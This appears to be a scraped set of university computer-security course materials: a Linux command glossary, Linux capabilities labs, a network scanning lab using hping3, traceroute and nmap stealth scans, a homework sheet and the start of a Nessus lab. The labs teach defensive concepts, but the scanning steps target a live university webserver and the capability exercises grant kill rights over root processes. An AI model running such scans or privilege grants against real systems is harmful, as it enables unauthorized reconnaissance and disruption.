⦁          ⦁        sleep    Delay for a specified time
⦁          ⦁        slocate Find files
⦁          ⦁        sort      Sort text files
⦁          ⦁        source  Run commands from a file '.'
⦁          ⦁        split     Split a file into fixed-size pieces
⦁          ⦁        ssh       Secure Shell client (remote login program)
⦁          strace   Trace system calls and signals
⦁          ⦁        su         Substitute user identity
⦁          ⦁        sudo     Execute a command as another user
⦁          ⦁        sum      Print a checksum for a file
⦁          ⦁        suspend  Suspend execution of this shell •
⦁          ⦁        sync     Synchronize data on disk with memory
⦁        t
⦁          ⦁        tail     Output the last part of file
⦁          ⦁        tar      Store, list or extract files in an archive
⦁          ⦁        tee      Redirect output to multiple files
⦁          ⦁        test     Evaluate a conditional expression
⦁          ⦁        time   Measure Program running time
⦁          ⦁        timeout  Run a command with a time limit
⦁          ⦁        times    User and system times
⦁          ⦁        touch    Change file timestamps
⦁          ⦁        top        List processes running on the system
⦁          ⦁        traceroute Trace Route to Host
⦁          trap      Run a command when a signal is set(bourne)
⦁          ⦁        tr          Translate, squeeze, and/or delete characters
⦁          ⦁        true      Do nothing, successfully
⦁          ⦁        tsort     Topological sort
⦁          ⦁        tty        Print filename of terminal on stdin
⦁          ⦁        type     Describe a command •
⦁        u
⦁          ⦁        ulimit     Limit user resources •
⦁          ⦁        umask    Users file creation mask
⦁          umount  Unmount a device
⦁          ⦁        unalias   Remove an alias •
⦁          ⦁        uname    Print system information
⦁          ⦁        unexpand Convert spaces to tabs
⦁          ⦁        uniq      Uniquify files
⦁          ⦁        units     Convert units from one scale to another
⦁          ⦁        unset    Remove variable or function names
⦁          ⦁        unshar   Unpack shell archive scripts
⦁          ⦁        until      Execute commands (until error)
⦁          uptime  Show uptime
⦁          ⦁        useradd  Create new user account
⦁          ⦁        userdel   Delete a user account
⦁          ⦁        usermod Modify user account
⦁          ⦁        users       List users currently logged in
⦁          ⦁        uuencode Encode a binary file 
⦁          ⦁        uudecode Decode a file created by uuencode
⦁        v
⦁          v         Verbosely list directory contents (`ls -l -b')
⦁          vdir    Verbosely list directory contents (`ls -l -b')
⦁          ⦁        vi        Text Editor
⦁          ⦁        vmstat Report virtual memory statistics
⦁        w
⦁          ⦁        wait     Wait for a process to complete •
⦁          ⦁        watch  Execute/display a program periodically
⦁          ⦁        wc       Print byte, word, and line counts
⦁          ⦁        whereis  Search the user's $path, man pages and source files for a program
⦁          ⦁        which    Search the user's $path for a program file
⦁          ⦁        while    Execute commands
⦁          ⦁        who      Print all usernames currently logged in
⦁          ⦁        whoami   Print the current user id and name (`id -un')
⦁          wget     Retrieve web pages or files via HTTP, HTTPS or FTP
⦁          ⦁        write    Send a message to another user 
⦁        x
⦁          ⦁        xargs    Execute utility, passing constructed argument list(s)
⦁          ⦁        xdg⦁        -open Open a file or URL in the user's preferred application.
⦁          ⦁        yes        Print a string until interrupted
⦁          ⦁        zip        Package and compress (archive) files.
⦁          ⦁        .            Run a command script in the current shell
⦁          ⦁        !!          Run the last command again
⦁          #           Comment / Remark
⦁          //        Comment / Remark"
"['bin', 'select date', 'security lab', 'root', 'command', 'capabilities', 'chown', 'cap', 'file', 'lab', 'kill', 'user', 'anotherping', 'ping', 'security', 'sudo', 'select', 'date', 'run', 'privileges', 'process', 'capability', 'question', 'killall', 'root privileges']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Linux Capabilities 1,Lab,"SECURITY LAB -[SELECT DATE]1
Linux Capabilities
 
SECURITY LAB -[SELECT DATE]2
Table of Contents
1. Introduction
2. CAP_NET_RAW
3. CAP_CHOWN
4. CAP_KILL
SECURITY LAB -[SELECT DATE]3
1. Introduction:
In Linux, there are two types of users: a superuser (root) with unrestricted privileges and 
normal (or unprivileged) users. In order to execute certain commands, the root privileges 
are required. However, normal users sometimes need to run these commands (represented 
by binary files) as well. This is achieved using “setuid”. If setuid bit is set on a binary 
(command), normal user can run it as the root user. Some examples of the suid commands 
are: ping, mount, su. However, setuid must be used with care: when a normal user runs
a setuid command, it has all root privileges including those which are not needed to fulfill
the intended operation. This excessive granting of privileges can be exploited by malware.
Starting with kernel 2.2, Linux divides the privileges traditionally associated with super user 
into distinct units, known as “capabilities”, which can be independently enabled and 
disabled. For the purpose of performing permission checks, traditional Unix 
implementations distinguish privileged processes (user ID is 0, root), and unprivileged 
processes (those with non-zero effective UID). Privileged processes bypass all kernel 
permission checks, while unprivileged processes are subject to full permission checking 
based on the process's credentials (usually: effective UID, effective GID [group ID], and 
supplementary group list). As the privileges are divided in capabilities it is possible to 
restrict access to executable files thus minimizing the risk.
POSIX file capabilities enables the storing of capabilities granted to and associated with 
a binary in the file system as an extended attribute. A file attribute is a property of a file. 
File attributes can be found by running attr command. For example “attr /bin/sh”: this 
command will show attributes of file /bin/sh. Additionally to the permissions derived from 
the credentials the process is running with, the process of the started binary can get more 
privileges through the associates capabilities of that binary. Because there was a lack of 
mean to grant a process only a certain capability and store it for retrieval, the only way for 
a process to have the needed capability was to be started in the context of root either 
through sudo, su , setuid 0 or by root itself. By definition, root has all the necessary 
privileges or capabilities. With granting the necessary capabilities beforehand to a certain 
program, an unprivileged user can now run this program without resulting in a root-power 
enabled process.
Hence, capabilities are a measure to grant a program only the essential privileges and store 
them in the extended attribute 'capability' and therefore a measure to limit the presence of 
omnipotent processes which had to run beforehand in the context of root.
Securing a system demands - among other steps - reducing the number of suid binaries. 
These binaries usually do not need the full range of root power. Just granting them enough 
power (i.e., capabilities) to do their job ensures that they will stay in their limits, hereby 
capabilities represent a mean to tighten security of a Linux system.
SECURITY LAB -[SELECT DATE]4
Read man page of “capabilities” before doing this lab. (Type “man capabilities” in your 
Linux terminal.)
In this lab, you will be using the Ubuntu 20 VM. The credentials are: 
Username: sec-lab
Password: untccdc
No report needs to be submitted for this lab (no grading and no credit), so no need to 
take screenshots and answer questions, as requested in the manual.
Nonetheless, you are expected to be familiar with the material covered in this lab.
2. CAP_NET_RAW
We use getcap command to know existing capabilities on a binary and setcap to set 
capabilities. In this exercise we check, set and remove capabilities (CAP_NET_RAW) on 
command anotherping (a copy of the executable file /bin/ping) and see the result in each 
step. There are 3 different sets of capabilities: permissive (set p), enforcing (set e) and 
inheritable (set i) 
Ping is a command used to verify network connection between two nodes on a network. 
Ping is setuid command which means it assumes root privileges whenever run by normal 
user. The ping command requires the (command) process to create a raw socket. This is the 
primary root privilege required. In the following exercise we first strip the ping binary off 
setuid bit, which makes it normal file, thus removing all root privileges. We then set 
CAP_NET_RAW capability on the binary file. Then when a normal user run the ping 
command, it only get this essential capability while all other root privileges are disabled, 
making the command more secure.
1. Log into the Ubuntu VM (as user sec-lab), open terminal.
2. Include the user “sec-lab” into the “sudoers” file to give this user the superuser 
permissions. (As it was done in Section “User Account Management” of Lab 0a.)
3. See the file capabilities on ping:
getcap /bin/ping (you might have to install libcap2-bin)
Question 1: What is the result? 
4. Make copy of the “ping”
sudo cp /bin/ping anotherping
ls (now you should see “anotherping” file in green in your present directory)
SECURITY LAB -[SELECT DATE]5
5. ls -l anotherping
ls -l /bin/ping
Note the difference in file attributes?
6. Run anotherping to ping to localhost
./anotherping –c 1 localhost (Note that you have to use a “./” (dot slash) before the 
command name as this is not native linux command, but a copy of command)
7. Try the same command with sudo:
sudo ./anotherping –c 1 localhost
Question 2: Attach screenshots for steps 5 and 6.
8. We use “setcap” command to set capabilities
sudo setcap cap_net_raw+ep anotherping
Question 3: Which sets of capabilities are set in above command?
9. Observer the file capabilities:
getcap anotherping
Question 4: What is the result? Attach screenshot of terminal.
10. ./anotherping –c 1 localhost. What do you see now?
11. Check the file attributes with following command
attr -l /bin/ping
Question 5: What is the result now? Attach screenshot
Note: If you do not have attr command installs it: sudo apt-get install attr.
12. Now delete 
sudo setcap –r anotherping
13. Check the file attributes, capabilities and again:
attr -l anotherping
getcap anotherping
./anotherping –c 1 localhost
sudo ./anotherping –c 1 localhost
14. Delete the file “anotherping”
rm –rf anotherping
3. CAP_CHOWN
In this exercise you’ll learn how to use “chown” command without root. We use 
cap_chown capability to run the command without root can change file ownership of 
the users (root).
SECURITY LAB -[SELECT DATE]6
1. Type “chown sec-lab /bin/kill” (note sec-lab is the user which you logged in)
Question 6: What is the result?
2. Now type “sudo chown sec-lab /bin/kill”
ls -l /bin/kill
Is the owner changed to sec-lab?
3. Change the owner back to root
sudo chown root /bin/kill
ls -l /bin/kill
4. Change the capability of “chown” command
sudo setcap cap_chown+ep /bin/chown
getcap /bin/chown
5. Now run the “chown” command without sudo
chown sec-lab /bin/kill
ls -l /bin/kill
Question 7: Is the owner changed successfully? Attach screenshot
6. Revert the owner back to root
chown root /bin/kill
7. Reset the capability.
chown root /bin/chown
ls -l /bin/chown
8. Check if capability is successfully removed
getcap /bin/chown
chown sec-lab /bin/kill
Question 8: What is the result?
Note: To remove/reset capabilities on a file here we use chown command(instead of 
setcap –r.Setcap still works, but I wanted to show you another way of doing it.) . Here 
we use “chown” against itself to remove its capability.
4. CAP_KILL
cap_kill capability can be applied to binaries like /bin/kill, /usr/bin/killall to kill a process 
run by any user whithout check for permissions. normal users are not allowed to kill 
process owned by other users. In this lab we set capability on “killall” and override 
“process ownership”and kill other user processes.
1. Find the process ID of current bash terminal
pidof bash
SECURITY LAB -[SELECT DATE]7
2. ps -aux | grep root
This will list all process by root.
type “killall -u root” 
Question 9: What is the result? Attach screenshot
3. Run this command to apply cap_kill on /usr/bin/killall
sudo setcap cap_kill+ep /usr/bin/killall
4. Check capabilities 
getcap /usr/bin/killall
5. now run this command:
killall -u root
Question 10: What happens? Attach screenshot
6. reset the VM: On VM window, got to top right, you find a menu:
Machine->reset
You can also reset VM from virtualbox main control panel: right click on the 
VM>reset
Again click on “reset” on confirmation popup window.
7. Login, open terminal
8. Type getcap /usr/bin/killall
sudo chown root /usr/bin/killall
9. verify capabilities: getcap /usr/bin/killall"
"['bin', 'command', 'ova file cscelab.ova', 'capabilities', 'root', 'file', 'chown', 'capability', 'anotherping', 'ova file', 'cap', 'root privileges', 'ping', 'sudo', 'kill', 'cscelab.ova on canvas', 'privileges', 'note', 'user', 'attach', 'chown root', 'run', 'process', 'linux', 'type']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Linux Capabilities 2,Lab,"Lab 2b:
Linux Capabilities Lab
This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas.

Section 1: Introduction

In Linux, there are two types of users: a superuser (root) with unrestricted privileges and normal (or unprivileged) users. In order to execute certain commands, the root privileges are required. However, normal users sometimes need to run these commands (represented by binary files) as well. This is achieved using the “setuid” access flag. If the setuid access flag (or bit) is set on a binary (command), a normal user can run it as the root user. Some examples of the suid commands are: ping, mount, su. However, setuid must be used with care: when a normal user runs a setuid command, it has all root privileges including those that are not needed to fulfill the intended operation. This excessive granting of privileges can be exploited by malware.

Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as “capabilities”, which can be independently enabled and disabled. For the purpose of performing permission checks, traditional Unix implementations distinguish privileged processes (user ID is 0, root), and unprivileged processes (those with non-zero effective UID). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID [group ID], and supplementary group list). As the privileges are divided in capabilities it is possible to restrict access to executable files thus minimizing the risk.

POSIX file capabilities enables the storing of capabilities granted to and associated with a binary in the file system as an extended attribute. A file attribute is a property of a file. File attributes can be found by running attr command. For example  “attr /bin/sh”: this command will show attributes of file /bin/sh. Additionally to the permissions derived from the credentials the process is running with, the process of the started binary can get more privileges through the associates capabilities of that binary. Because there was a lack of mean to grant a process only a certain capability and store it for retrieval, the only way for a process to have the needed capability was to be started in the context of root either through sudo, su, setuid 0 or by root itself. By definition, root has all the necessary privileges or capabilities. With granting the necessary capabilities beforehand to a certain program, an unprivileged user can now run this program without resulting in a root-power enabled process.

Hence, capabilities are a measure to grant a program only the essential privileges and store them in the extended attribute 'capability' and therefore a measure to limit the presence of omnipotent processes which had to run beforehand in the context of root.

Securing a system demands - among other steps - reducing the number of suid binaries. These binaries usually do not need the full range of root power. Just granting them enough power (i.e., capabilities) to do their job ensures that they will stay in their limits, hereby capabilities represent a mean to tighten security of a Linux system.

Read man page of “capabilities” before doing this lab. (Type “man capabilities” in your Linux terminal.)

Use the Ubuntu 20.04 VM with the following credentials:
username: sec-lab
password: untccdc

IMPORTANT NOTE: Before performing the lab, you must change 
the command prompt of your terminal to show your EUID. 
For this, complete the following steps.

Create a backup copy of your configuration file:
cp ~/.bashrc ~/.bashrc.bak

Type:
sudo nano ~/.bashrc

Scroll to the very end of the file, and add the following line:
PS1=""euid@\h:\w\$ ""
Note: In the above line, “euid” should be replaced with your actual EUID. 
Also, note that there is a space between “$” and the last quote mark.
Example: Suppose that your EUID is “aa0001”, in this case the above line should be:
PS1=""aa0001@\h:\w\$ ""
IMPORTANT: Do not change anything else in the configuration file!
Note that although you changed the prompt, your actual username (and hence the login credentials shown before this note remain the same). To verify it, type:
whoami
Log off and login as the user “sec-lab”. 
Confirm that the command prompt displays your EUID instead of the username “sec-lab”.
Note: If needed, it is possible to revert to the original configuration using the backup copy of the configuration file (simply by copying “bashrc.bak” to “bashrc”). 

Section 2: Capability CAP_NET_RAW

We use getcap command to know existing capabilities on a binary and setcap to set capabilities. In this exercise we check, set and remove capabilities (CAP_NET_RAW) on command anotherping (a copy of the executable file /bin/ping) and see the result in each step. There are 3 different sets of capabilities: permissive (set p), enforcing (set e) and inheritable (set i) 

Ping is a command used to verify network connection between two nodes on a network. Ping is setuid command which means it assumes root privileges whenever run by normal user. The ping command requires the (command) process to create a raw socket. This is the primary root privilege required. In the following exercise we first strip the ping binary off setuid bit, which makes it normal file, thus removing all root privileges. We then set CAP_NET_RAW capability on the binary file. Then when a normal user run the ping command, it only get this essential capability while all other root privileges are disabled, making the command more secure.

Log into the Ubuntu VM (as user sec-lab) and open the terminal.

See the file capabilities on ping:
getcap /bin/ping 

(If this did not work, you might have to install libcap2-bin.)

Q1: What is the result? (Attach the screenshot.)

Make copy of the “ping”
sudo cp /bin/ping anotherping
ls
 
Now, you should see “anotherping” file in green in your present directory.


Type:
ls -l anotherping
ls -l /bin/ping

Notice the difference in the file attributes.

Run anotherping to ping to localhost
./anotherping –c 1 localhost

Note that you have to use a “./” (dot slash) before the command name as this is not a native Linux command, but a copy of command.

Try the same command with sudo:
sudo ./anotherping –c 1 localhost

Q2: Attach the screenshots for steps 5 and 6.

	
We use the “setcap” command to set capabilities:
sudo setcap cap_net_raw+ep anotherping

Q3: Which sets of capabilities are enabled in the above command?

Observe the file capabilities:
getcap anotherping

Q4: What is the result? Attach a screenshot of the terminal. 

./anotherping –c 1 localhost. What do you see now?

Check the file attributes with following command
attr -l /bin/ping

Q5: What is the result now? Attach the screenshot.

Note: If you do not have the attr utility, install it: sudo apt-get install attr.
	 
Now delete: 
sudo setcap –r anotherping

Check the file attributes, capabilities and again:
attr -l anotherping
getcap anotherping
./anotherping –c 1 localhost
sudo ./anotherping –c 1 localhost

Delete the file “anotherping”:
rm –rf anotherping


Section 3: Capability CAP_CHOWN

In this section, we will learn how to use “chown” command without the root privileges using the cap_chown capability.

Type “chown sec-lab /bin/kill” (note that sec-lab is the current user).

Q6: What is the result? Attach the screenshot.

Now type “sudo chown sec-lab /bin/kill”
ls -l /bin/kill
Is the owner changed to sec-lab?

Change the owner back to root:
sudo chown root /bin/kill
ls -l /bin/kill

Change the capability of “chown” command
sudo setcap cap_chown+ep /bin/chown
getcap /bin/chown

Now run the “chown” command without sudo
chown sec-lab /bin/kill
ls -l /bin/kill

Q7: Has the owner changed successfully? Attach the screenshot.

Revert the owner back to root
chown root /bin/kill

Reset the capability. 
chown root /bin/chown
ls -l /bin/chown

Check if capability is successfully removed
getcap /bin/chown
chown sec-lab /bin/kill

Q8: What is the result? Attach the screenshot.

Note: To remove/reset capabilities on a file, we used the chown command - instead of setcap -r. The later command (setcap) still works, but we wanted to demonstrate an alternative way of doing it. Note that we used chown against itself to remove its capability.


Section 3: Capability CAP_KILL

The cap_kill capability can be applied to binaries such as /bin/kill, /usr/bin/killall to terminate a process run by any user without checking for permissions. Normal users are not allowed to kill process owned by other users. In this lab, we will set this capability on killall hereby overriding the process ownership and terminating other users’ processes.

Find the process ID of the current bash terminal:
pidof bash

Type:
ps -aux | grep root

This will list all processes owned by root. 
Then type:
killall -u root

Q9: What is the result? Attach the screenshot.
Run this command to apply cap_kill on /usr/bin/killall
sudo setcap cap_kill+ep /usr/bin/killall

Check capabilities: 
getcap /usr/bin/killall

Now, run this command:
killall -u root

Q10: What is the result? Attach the screenshot.

Reset the VM: In the VM window, got to top right, you will find a menu:
Machine  Reset
(Alternatively, you can reset the VM from the VirtualBox main control window: 
Right-click on the VM  Reset, click on “Reset” in the confirmation popup window.)

Login, open the terminal.

Type:
getcap /usr/bin/killall
sudo chown root /usr/bin/killall

Verify capabilities: 
getcap /usr/bin/killall

Q11: What is the result? Attach the screenshot.

"
"['network scanning lab', 'network scanning', 'scanning lab', 'scanning', 'scan', 'ping', 'icmp', 'nmap', 'command', 'network', 'ports', 'syn', 'tcp', 'port scanning', 'port', 'lab', 'ack scan', 'packets', 'traceroute', 'attach a screenshot', 'tcp syn packets', 'scanning lab command', 'packet', 'icmp echo reply', 'ack']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Network Scanning,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
Lab 1a: Network Scanning
This lab uses the Kali 2020 virtual machine (VM). The credentials are: 
Username: osboxes
Password: osboxes.org
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as 
described in the Command Prompt Customization Manual. This customization manual directs 
you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do 
not comply with this requirement will receive no credit. 
Introduction
Scanning is the first phase of an active attack; its purpose is to gather intelligence on the network 
structure and its individual hosts. The information which may be collected includes IP addresses, host’s 
operating system, running services, and installed applications. More specifically, scanning the network 
is a process of locating systems that are alive and responsive. There are various types of scanning, but 
in this lab, we will focus on port scanning and network scanning. Port scanning is the process of 
identifying open and available TCP/IP ports on a system. 
Port scanning tools enable us to learn about the services available on a given system. Each service or 
application on a host is associated with a specific port number. Port numbers are divided into 
the following three ranges: 
• “Well-known ports”: 0-1023
• “Registered ports”: 1024-49151
• “Dynamic ports”: 49152-65535
It is helpful to know a usual assignment of ports for major services.
Ping
Ping sweep techniques start with checking for systems that respond to probes or connection requests. 
This is the simplest, although not the most accurate way to determine whether systems are live. A ping 
sweep is also known as Internet Control Message Protocol (ICMP) scanning, as ICMP is the protocol 
used by the “ping” command. This is the process of sending an ICMP request or ping to all hosts on 
the network to determine which ones are online. It is a quick test to see if two hosts have connectivity 
and it is used extensively for troubleshooting. A benefit of ping is that it can run in parallel, meaning 
that all systems are scanned at the same time, and hence it can be done quickly. A downside of this 
approach is that systems can disable ICMP, thus the ping sweep may not give accurate information 
about the network. Windows, MacOS, and Linux all have a built-in ping command. To run it, type the 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
command “ping” and then the domain or IP address that you wish to check (to exit the command, press 
CTRL-C).
There exist more advanced tools for network scanning, for example “hping3”. This tool has a lot of 
extra options on top of the basic ping functionality. The most useful of them is, for instance, crafting 
the packets to get a response from a host that has ICMP disabled. We will consider such the example 
next. 
Ping Examples:
1. Open a terminal.
Q1: Type the “ping www.unt.edu” command, and after a few seconds press 
“Ctrl + C” – this will cancel the ping. Attach a screenshot of the result.
2. As you can see, there was no response from www.unt.edu because it showed your packets 
transmitted and 0 received with a 100% packet loss. Now, stay in your terminal and use hping3 
to launch a successful ping request.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
Remark: If pinging www.unt.edu worked for you, it must be either because this webserver temporarily 
unblocked ICMP requests, or you are in some special subnetwork for which these requests are allowed. 
No worries. ""#$% Just attach a screenshot of the result (as requested above) and continue to the next step.
Q2: Type command “sudo hping3 -S www.unt.edu -p 80”, and after a few seconds 
press “Ctrl + C” – this will cancel the ping. Attach a screenshot of the result.
3. Here, we use a “-S” option to tell hping3 to use SYN packets. A SYN packet is the first packet 
sent in the 3-way handshake for TCP connections. Knowing that www.unt.edu is a webserver, 
we are sure that it has to handle SYN packets for legitimate connections. Therefore, we use the 
“-p 80” parameter to have hping3 hit the port 80 (which is used for the HTTP protocol). 
Hereby, we use the TCP protocol to manipulate the UNT webserver to send us a reply—as you 
can see, we should now have 0% packet loss.
4. Some websites do not filter out ICMP Echo Requests.
Q3: Type a command “ping scanme.nmap.org”, and after a few seconds press “Ctrl + C” – this 
will cancel the ping. Attach a screenshot of the result.
Traceroute
Traceroute is a computer network diagnostic tool for displaying the route and measuring transit delays 
of packets across an Internet Protocol network. Traceroute is very useful for learning the routes that 
your packets are taking to a particular target. This tool uses the Time-To-Live (TTL) flag for packets. 
This is a flag that lets networking devices know how far they should forward the packet. Specifically, 
every time when the packet reaches a device, the TTL is dropped by one. For example, most Windows 
devices use a TTL of 128 and Unix of 64 – this allows 128 (respectively, 64) total hops once the packet 
leaves your machine. This is a crucial mechanism for allowing packets that get lost to be dropped 
instead of endlessly traversing the network and hereby consuming the bandwidth. 
Traceroute uses TTL in the following manner: Your first packet will start with a TTL of 1, therefore
the first message gets dropped at the first router it hits and the router sends back an ICMP error 
message “Time Exceeded”. In the second packet, the TTL will be set to 2, so that the first router will 
forward the packet, but the next one will drop it. Traceroute uses the returned ICMP Time Exceeded 
messages to build a list of routers that packets traverse until the destination is reached and returns an 
ICMP Echo Reply message. This information is used to learn the route to a particular destination. If
one knows what to look for, one can identify firewalls, routers, honeypots, proxy servers, and 
sometimes, even hosts performing the man-in-the-middle attack. 
Traceroute Examples:
1. Open a terminal.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
2. Type the command “sudo apt-get update”, then “sudo apt-get install traceroute” to install 
the traceroute utility. You may expect to see the screen as shown below.
Q4: Type: “sudo traceroute www.unt.edu”. Attach a screenshot of the result. 
Q5: Summarize your observations in the previous question, and also explain why the symbol “*” 
is shown. (You are allowed to do the Internet search, when looking for answers to this question.)
3. The traceroute functionality by default sends UDP packets with destination port from a certain 
range (which normally has no service associated with it) and then uses a reply with ICMP 
Destination Unreachable messages to compute the route. As routers may block these messages, 
an alternative may be to use ICMP Echo Reply messages generated using the option “-I”.
Q6: Use the command “sudo traceroute -I www.unt.edu”.
Attach a screenshot and summarize your observations.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
Remark: If tracing gets stuck at a certain hop, you may press “Ctrl + C” to stop the traceroute.
4. An alternative approach is to use TCP SYN packets:
Q7: Use the command “sudo traceroute -T www.unt.edu”.
Attach a screenshot and summarize your observations.
For more information on the traceroute tool, check the manual by typing “traceroute --help”
in the command line.
NMAP
Nmap is a free, open-source tool that quickly and efficiently performs ping sweeps, port scanning, 
service identification, IP address detection, and operating system detection. 
Nmap has the benefit of scanning a large number of machines in a single session. 
It is supported by various operating systems, including Unix, Windows, and Linux. 
The state of a port, as determined by an Nmap scan, can be “open”, “filtered”, or “unfiltered”. “Open”
means that the target machine accepts incoming requests on that port. “Filtered” means that a firewall 
or network filter is screening the port and preventing Nmap from discovering whether it is open. 
“Unfiltered” mean the port is determined to be closed, and no firewall or filter is interfering with 
the Nmap results. 
Types of Nmap scans
TCP Connect: The user makes a full TCP connection to the target system. This types of scan is the 
most reliable but also the easiest to detect. Open ports reply with an SYN/ACK while closed ports reply 
with an RST/ACK packet. TCP connect scans can be slow since a full connection is attempted. 
XMAS Tree: The scanner checks for TCP services by sending the so-called XMAS-tree packets, 
which are so named because all the “lights” are on, meaning that the FIN, URG, and PSH flags are set. 
These flags are bits that signify various connection settings for TCP packets. Closed ports reply with 
an RST flag.
SYN Stealth Scan: This is also known as half-open scanning. The attacker sends a SYN packet and 
receives a SYN/ACK back from the server. It is considered stealthy because a full TCP connection is
not opened. Open ports reply with a SYN/ACK while closed ports reply with an RST/ACK.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
Null Scan: This is an advanced scan that may be able to pass through firewalls undetected or modified. 
Null scan has all flags off or not set. It only works on Unix systems. Closed ports will return an RST
flag.
Windows Scan: This type of scan is similar to the ACK scan (described next) and can also detect open 
ports. 
ACK scan: This type of scan is used to map out firewall rules. ACK scan only works on Unix. 
The port is considered filtered by firewall rules if an “ICMP Destination Unreachable” message is 
received as a result of the ACK scan.
Now that we discussed some of the types of scans which are available in Nmap, let us go over some of 
the command option that allow us to enable them. Similar to “hping3”, Nmap is a command-line based 
tool. The syntax is similar to the standard Linux commands: Type “nmap”, the options, specific ports if 
any, and then the target IP address or domain name. The options can be used in a wide variety of 
combinations; the popular ones are listed below. 
• TCP connect scan: -sT
• SYN scan: -sS
• XMAS scan: -sX
• Ping scan: -sP 
• UDP scan: -sU
• RPC scan: -sR
• List DNS: -sL
• TCP ping: -PT
• SYN ping: -PS
• ICMP ping: -PI
• No ping: -Pn (skip the host discovery, i.e., scan IP address(es) without pinging them first.)
• OS discovery: -A
By default, Nmap scans the top 1000 most common ports. 
One can specify ports using the option “-p [ports]”, to scan all ports use “-p-”.
Next, let us discuss how to scan all the live hosts on the same network. Note that some of the scans 
might take a few minutes to run.
NMAP Examples:
Open a terminal.
Q8: Run the command “nmap -sP www.unt.edu” (wait some time for it to complete). 
Attach a screenshot of the result. Explain your observations.
Note the IP address shown by the above command, and let us use it for the next two questions. 
We will denote it by [IP-address] in the commands.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Network Scanning Lab
Q9: Run the command “sudo nmap -sS -PN -A [IP-address]” (wait some time for it to complete). 
Attach a screenshot of the result.
Remark: Let us review the options that we use: “-sS” will switch on a SYN scan in a stealth mode, 
“-PN” will force scanning of the host without pinging it first, and “-A” will switch on OS detection.
Q10: Based on the output of the above command, what type of device are you facing?
Next, let us scan another website – the Nmap test server.
Q11: Run “sudo nmap -sS -PN -A scanme.nmap.org”. Attach a screenshot of the result.
What is an OS on the machine that hosts “scanme.nmap.org”?
The OS discovery information in the previous command may be unreliable, but given other information 
it is easy to guest the scanned host OS.
For scanning specific ports or port ranges use the “-p” option. Let us scan for port 22, which is 
typically assigned to SSH.
Q12: Run “sudo nmap -sS -p 22 scanme.nmap.org”. Attach a screenshot of the result."
"['document in canvas', 'text document', 'form of submission', 'points', 'network', 'ids', 'due', 'april', 'pdf', 'word', 'wednesday', 'form', 'canvas', 'text', 'document', 'single point', 'ids monitors', 'point', 'network access point', 'deploy an ids', 'mode ids', 'security analyst', 'justify your answer', 'attackers penetrate', 'answer']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Network Security,Homework,"Homework 5
Due: 11:59 PM on Wednesday, April 6, 2022
Form of submission: PDF, Word, or Text Document in Canvas
	
⦁	(16 Points) Consider the following network:
 
As a security analyst, you want to deploy an IDS to determine if any attackers penetrate this network.
⦁	Where should the IDS monitors be placed in this network’s topology. Note that you may place more than one. Justify your answer.



⦁	If you wanted to protect against insider attacks (i.e., attacks from inside this network), how would your answer in (a) change? Or would it? Be specific. Justify your answer.


 
⦁	(12 Points) Telecommunications network providers and users are concerned about the single point of failure in “the last mile,” which is the single cable from the network provider’s last switching station to the customer’s premises. How can a customer protect against that single point of failure? Comment on whether your approach presents a good cost-benefit trade-off.




⦁	(12 Points) The open systems interconnection (OSI) model is inefficient; each layer must take the work of higher layers, add some result, and pass the work to lower layers. This process ends with the equivalent of a gift (i.e., payload) inside seven nested boxes, each one wrapped and sealed. Surely this wrapping (and unwrapping) is inefficient. From a security perspective, describe two advantages of the layered approach.





⦁	(12 Points) A port scanner is a tool useful to an attacker to identify possible vulnerabilities in a potential victim’s system. Cite a situation in which someone who is not an attacker could use a port scanner for a non-malicious purpose.





⦁	(12 Points) How can a website distinguish between lack of capacity and a denial-of-service attack? For example, websites often experience a tremendous increase in volume of traffic right after an advertisement with the site’s URL is shown on television during the broadcast of a popular sporting event. That spike in usage is the result of normal access that happens to occur at the same time. How can a site determine that high traffic is reasonable?






⦁	(12 Points) Suppose you have a high-capacity network connection coming into your home, and you also have a wireless network access point. Also suppose you do not use the full capacity of your network connection. List three reasons you might still want to prevent an outsider’s obtaining free network access by intruding into your wireless network.




⦁	(12 Points) Should a network administrator put a firewall in front of a honeypot? Why or why not?




⦁	(12 Points) Why does a stealth mode IDS need a separate network to communicate alarms and to accept management commands?

"
"['local security checks', 'local security', 'security checks', 'nessus', 'ubuntu local security', 'local', 'professional feed', 'security', 'checks', 'home feed', 'vulnerabilities', 'scan', 'click', 'feed', 'finding local vulnerabilities', 'linux local security', 'target', 'debian local security', 'fedora local security', 'gentoo local security', 'mandriva local security', 'slackware local security', 'solaris local security', 'hat local security', 'ubuntu local']",The University of North Texas,SECURE ECOMMERCE,5560,Network Vulnerabilities,Lab,"Lab 3: Nessus Lab

This lab uses the Kali 2021 virtual machine (VM) as OVA file KALI-20.ova on Canvas. The credentials are as follows: 
Username:         osboxes
Password:         osboxes.org





INSTALLING, CONFIGURING AND USING NESSUS

In this recipe, we install, configure, and start Nessus. Nessus depends on vulnerability checks in the form of feeds to locate vulnerabilities on our chosen target. Nessus comes into two flavors of feeds: Home and Professional.
⦁        Home Feed: The Home Feed is for noncommercial/personal usage. Using Nessus in a professional environment for any reason requires the use of the Professional Feed. 
⦁        Professional Feed: The Professional Feed is for commercial usage. It includes support and additional features such as unlimited concurrent connections and so on. If you are a consultant and are performing tests for a client, the Professional Feed is the one for you.
For our recipe, we will assume you are utilizing the Home Feed.

Notes:

1.        Do this Lab in Kali-20.ova VM (username : osboxes ; password : osboxes.org) and metasploitable 2 (username :  msfadmin ; password : msfadmin). Download Metasploitable from “https://information.rapid7.com/download-metasploitable-2017.html”

